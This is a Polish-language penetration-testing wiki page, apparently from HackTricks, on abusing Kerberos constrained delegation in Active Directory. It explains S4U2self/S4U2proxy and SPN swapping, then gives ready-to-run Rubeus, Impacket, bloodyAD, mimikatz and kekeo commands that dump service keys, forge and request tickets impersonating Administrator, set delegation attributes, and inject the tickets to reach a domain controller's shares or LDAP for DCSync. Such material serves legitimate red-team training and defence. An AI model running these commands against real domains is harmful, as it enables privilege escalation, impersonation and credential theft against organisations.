# Constrained Delegation

{{#include ../../banners/hacktricks-training.md}}

## Constrained Delegation

Dzięki temu administrator domeny może **zezwolić** komputerowi na **podszywanie się pod użytkownika lub komputer** wobec dowolnej **usługi** na maszynie.

- **Service for User to self (_S4U2self_):** Jeśli **konto usługi** ma wartość _userAccountControl_ zawierającą [TrustedToAuthForDelegation](<https://msdn.microsoft.com/en-us/library/aa772300(v=vs.85).aspx>) (T2A4D), to może uzyskać TGS dla siebie (usługi) w imieniu dowolnego innego użytkownika.
- **Service for User to Proxy(_S4U2proxy_):** **Konto usługi** może uzyskać TGS w imieniu dowolnego użytkownika do usługi ustawionej w **msDS-AllowedToDelegateTo.** Aby to zrobić, najpierw potrzebuje TGS od tego użytkownika do siebie, ale może użyć S4U2self, żeby wcześniej uzyskać ten TGS przed żądaniem drugiego.

**Uwaga**: Jeśli użytkownik jest oznaczony jako ‘_Account is sensitive and cannot be delegated_’ w AD, nie będziesz w stanie się pod niego **podszyć**.

Oznacza to, że jeśli **zdobędziesz hash usługi** możesz **podszywać się pod użytkowników** i uzyskać **dostęp** w ich imieniu do dowolnej **usługi** na wskazanych maszynach (możliwy **privesc**).

Co więcej, **nie będziesz miał dostępu tylko do usługi, pod którą użytkownik może się podszyć, ale także do dowolnej innej usługi**, ponieważ SPN (nazwa usługi żądanej) nie jest sprawdzany (ta część w bilecie nie jest szyfrowana/podpisana). Dlatego, jeśli masz dostęp do **usługi CIFS**, możesz również uzyskać dostęp do **usługi HOST** używając np. flagi `/altservice` w Rubeus. Ta sama słabość związana z zamianą SPN jest wykorzystywana przez **Impacket getST -altservice** i inne narzędzia.

Również dostęp do **usługi LDAP na DC** jest tym, co jest potrzebne do wykorzystania **DCSync**.
```bash:Enumerate
# Powerview
Get-DomainUser -TrustedToAuth | select userprincipalname, name, msds-allowedtodelegateto
Get-DomainComputer -TrustedToAuth | select userprincipalname, name, msds-allowedtodelegateto

#ADSearch
ADSearch.exe --search "(&(objectCategory=computer)(msds-allowedtodelegateto=*))" --attributes cn,dnshostname,samaccountname,msds-allowedtodelegateto --json
```

```bash:Quick Way
# Generate TGT + TGS impersonating a user knowing the hash
Rubeus.exe s4u /user:sqlservice /domain:testlab.local /rc4:2b576acbe6bcfda7294d6bd18041b8fe /impersonateuser:administrator /msdsspn:"CIFS/dcorp-mssql.dollarcorp.moneycorp.local" /altservice:ldap /ptt
```
### Cross-domain constrained delegation notes (2025+)

Od **Windows Server 2012/2012 R2** KDC obsługuje **constrained delegation across domains/forests** za pomocą rozszerzeń S4U2Proxy.

Nowe buildy (Windows Server 2016–2025) zachowują to zachowanie i dodają dwa PAC SIDs, które sygnalizują protocol transition:

- `S-1-18-1` (**AUTHENTICATION_AUTHORITY_ASSERTED_IDENTITY**) gdy użytkownik uwierzytelnił się normalnie.
- `S-1-18-2` (**SERVICE_ASSERTED_IDENTITY**) gdy usługa zadeklarowała tożsamość poprzez protocol transition.

Spodziewaj się `SERVICE_ASSERTED_IDENTITY` wewnątrz PAC, gdy protocol transition jest używane across domains, co potwierdza, że krok S4U2Proxy powiódł się.

### Impacket / Linux narzędzia (altservice & full S4U)

Nowsze Impacket (0.11.x+) udostępnia ten sam S4U chain i SPN swapping co Rubeus:
```bash
# Get TGT for delegating service (hash/aes)
getTGT.py contoso.local/websvc$ -hashes :8c6264140d5ae7d03f7f2a53088a291d

# S4U2self + S4U2proxy in one go, impersonating Administrator to CIFS then swapping to HOST
getST.py -spn CIFS/dc.contoso.local -altservice HOST/dc.contoso.local \
-impersonate Administrator contoso.local/websvc$ \
-hashes :8c6264140d5ae7d03f7f2a53088a291d -k -dc-ip 10.10.10.5

# Inject resulting ccache
export KRB5CCNAME=Administrator.ccache
smbclient -k //dc.contoso.local/C$ -c 'dir'
```
Jeśli wolisz najpierw sfałszować ST użytkownika (np. tylko hash offline), połącz **ticketer.py** z **getST.py** dla S4U2Proxy. Zobacz otwarte zgłoszenie Impacket #1713 dotyczące bieżących problemów (KRB_AP_ERR_MODIFIED gdy sfałszowany ST nie pasuje do klucza SPN).

### Automatyzacja konfiguracji delegacji z poświadczeniami o niskich uprawnieniach

Jeśli masz już **GenericAll/WriteDACL** nad kontem komputera lub kontem usługi, możesz zdalnie ustawić wymagane atrybuty bez RSAT, używając **bloodyAD** (2024+):
```bash
# Set TRUSTED_TO_AUTH_FOR_DELEGATION and point delegation to CIFS/DC
KRB5CCNAME=owned.ccache bloodyAD -d corp.local -k --host dc.corp.local add uac WEBSRV$ -f TRUSTED_TO_AUTH_FOR_DELEGATION
KRB5CCNAME=owned.ccache bloodyAD -d corp.local -k --host dc.corp.local set object WEBSRV$ msDS-AllowedToDelegateTo -v 'cifs/dc.corp.local'
```
To pozwala zbudować ścieżkę constrained delegation dla privesc bez uprawnień DA, o ile możesz zapisać te atrybuty.

- Krok 1: **Uzyskaj TGT dla dozwolonej usługi**
```bash:Get TGT
# The first step is to get a TGT of the service that can impersonate others
## If you are SYSTEM in the server, you might take it from memory
.\Rubeus.exe triage
.\Rubeus.exe dump /luid:0x3e4 /service:krbtgt /nowrap

# If you are SYSTEM, you might get the AES key or the RC4 hash from memory and request one
## Get AES/RC4 with mimikatz
mimikatz sekurlsa::ekeys

## Request with aes
tgt::ask /user:dcorp-adminsrv$ /domain:sub.domain.local /aes256:babf31e0d787aac5c9cc0ef38c51bab5a2d2ece608181fb5f1d492ea55f61f05
.\Rubeus.exe asktgt /user:dcorp-adminsrv$ /aes256:babf31e0d787aac5c9cc0ef38c51bab5a2d2ece608181fb5f1d492ea55f61f05 /opsec /nowrap

# Request with RC4
tgt::ask /user:dcorp-adminsrv$ /domain:sub.domain.local /rc4:8c6264140d5ae7d03f7f2a53088a291d
.\Rubeus.exe asktgt /user:dcorp-adminsrv$ /rc4:cc098f204c5887eaa8253e7c2749156f /outfile:TGT_websvc.kirbi
```
> [!WARNING]
> Istnieją inne sposoby uzyskania **TGT ticket** lub **RC4** albo **AES256** bez bycia SYSTEM na komputerze, takie jak Printer Bug, unconstrain delegation, NTLM relaying i Active Directory Certificate Service abuse
>
> **Mając tylko ten TGT ticket (or hashed) możesz wykonać ten atak bez kompromitowania całego komputera.**

- Krok 2: **Pobierz TGS dla usługi podszywając się pod użytkownika**
```bash:Using Rubeus
# Obtain a TGS of the Administrator user to self
.\Rubeus.exe s4u /ticket:TGT_websvc.kirbi /impersonateuser:Administrator /outfile:TGS_administrator

# Obtain service TGS impersonating Administrator (CIFS)
.\Rubeus.exe s4u /ticket:TGT_websvc.kirbi /tgs:TGS_administrator_Administrator@DOLLARCORP.MONEYCORP.LOCAL_to_websvc@DOLLARCORP.MONEYCORP.LOCAL /msdsspn:"CIFS/dcorp-mssql.dollarcorp.moneycorp.local" /outfile:TGS_administrator_CIFS

#Impersonate Administrator on different service (HOST)
.\Rubeus.exe s4u /ticket:TGT_websvc.kirbi /tgs:TGS_administrator_Administrator@DOLLARCORP.MONEYCORP.LOCAL_to_websvc@DOLLARCORP.MONEYCORP.LOCAL /msdsspn:"CIFS/dcorp-mssql.dollarcorp.moneycorp.local" /altservice:HOST /outfile:TGS_administrator_HOST

# Get S4U TGS + Service impersonated ticket in 1 cmd (instead of 2)
.\Rubeus.exe s4u /impersonateuser:Administrator /msdsspn:"CIFS/dcorp-mssql.dollarcorp.moneycorp.local" /user:dcorp-adminsrv$ /ticket:TGT_websvc.kirbi /nowrap

#Load ticket in memory
.\Rubeus.exe ptt /ticket:TGS_administrator_CIFS_HOST-dcorp-mssql.dollarcorp.moneycorp.local
```

```bash:kekeo + Mimikatz
#Obtain a TGT for the Constained allowed user
tgt::ask /user:dcorp-adminsrv$ /domain:dollarcorp.moneycorp.local /rc4:8c6264140d5ae7d03f7f2a53088a291d

#Get a TGS for the service you are allowed (in this case time) and for other one (in this case LDAP)
tgs::s4u /tgt:TGT_dcorpadminsrv$@DOLLARCORP.MONEYCORP.LOCAL_krbtgt~dollarcorp.moneycorp.local@DOLLAR CORP.MONEYCORP.LOCAL.kirbi /user:Administrator@dollarcorp.moneycorp.local /service:time/dcorp-dc.dollarcorp.moneycorp.LOCAL|ldap/dcorpdc.dollarcorp.moneycorp.LOCAL

#Load the TGS in memory
Invoke-Mimikatz -Command '"kerberos::ptt TGS_Administrator@dollarcorp.moneycorp.local@DOLLARCORP.MONEYCORP.LOCAL_ldap~ dcorp-dc.dollarcorp.moneycorp.LOCAL@DOLLARCORP.MONEYCORP.LOCAL_ALT.kirbi"'
```
[**More information in ired.team.**](https://www.ired.team/offensive-security-experiments/active-directory-kerberos-abuse/abusing-kerberos-constrained-delegation) i [**https://posts.specterops.io/kerberosity-killed-the-domain-an-offensive-kerberos-overview-eb04b1402c61**](https://posts.specterops.io/kerberosity-killed-the-domain-an-offensive-kerberos-overview-eb04b1402c61)

## Referencje
- [Kerberos Constrained Delegation Overview (Microsoft Learn, 2025)](https://learn.microsoft.com/en-us/windows-server/security/kerberos/kerberos-constrained-delegation-overview)
- [Impacket issue #1713 – S4U2proxy forged service ticket errors](https://github.com/fortra/impacket/issues/1713)

{{#include ../../banners/hacktricks-training.md}}
